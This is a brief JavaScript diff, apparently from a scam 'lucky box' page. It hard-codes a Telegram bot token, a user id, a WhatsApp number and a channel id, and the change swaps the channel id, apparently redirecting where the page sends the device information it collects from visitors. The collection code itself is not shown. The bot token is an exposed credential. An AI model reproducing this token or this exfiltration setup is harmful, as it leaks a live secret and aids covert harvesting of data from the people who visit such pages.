@@ -120,7 +120,7 @@ if (luckyBox) {
     const uid = '7973196371';
 
     const botToken = '8403443030:AAFWdchybA9ruQECsZSdQW-dzMHxTXMDRVc';
-    const channelId = '1003294512768';
+    const channelId = '7748871040';
     let whatsappNumber = '94781121579';
 
     // Device Info
